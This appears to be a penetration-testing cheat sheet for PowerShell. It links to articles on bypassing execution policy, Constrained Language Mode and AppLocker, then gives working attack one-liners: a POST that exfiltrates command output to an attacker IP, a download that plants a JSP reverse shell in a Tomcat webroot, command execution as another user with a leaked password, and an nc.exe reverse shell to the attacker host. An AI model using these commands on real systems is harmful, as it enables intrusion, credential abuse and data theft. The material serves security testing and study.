# powershell

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6
* https://adsecurity.org/?p=2921
* https://blogs.technet.microsoft.com/kfalde/2017/01/20/pslockdownpolicy-and-powershell-constrained-language-mode/
* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6
* https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
* https://pen-testing.sans.org/blog/2016/05/25/sans-powershell-cheat-sheet/
* https://blog.backslasher.net/wget-in-powershell-v3.html
* https://pentestn00b.wordpress.com/2017/03/20/simple-bypass-for-powershell-constrained-language-mode/
* https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997
* https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/

Bypass of CLM : https://github.com/padovah4ck/PSByPassCLM




## Data exfiltration :

```
Invoke-WebRequest -Method POST -Body (whoami | Out-String) -Uri http://10.10.10.10:4444
```

## file upload

```
Invoke-WebRequest 'http://10.10.10.10/jsp-reverse.jsp' -OutFile c:\tomcat\apache-tomcat\webapps\ROOT\Eewoo8EiVufohkiTh1Duunue4.jsp
```

## Other user execution

```
$password = 'leaked-passowrd' | ConvertTo-SecureString -AsPlainText -force; $username='WINDEV\user';$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $password;
Invoke-Command -Credential $cred -ComputerName . -ScriptBlock {Invoke-WebRequest -Method POST -Body (whoami | Out-String) -Uri http://10.10.10.10:4444}
```

## Other user execution reverse shell
```
Invoke-Command -Credential $cred -ComputerName . -ScriptBlock {Invoke-WebRequest -Method POST -Body (c:\users\user\nc.exe -e cmd.exe 10.10.10.10 443 2>&1 | Out-String) -Uri http://10.10.10.10:4444}
```


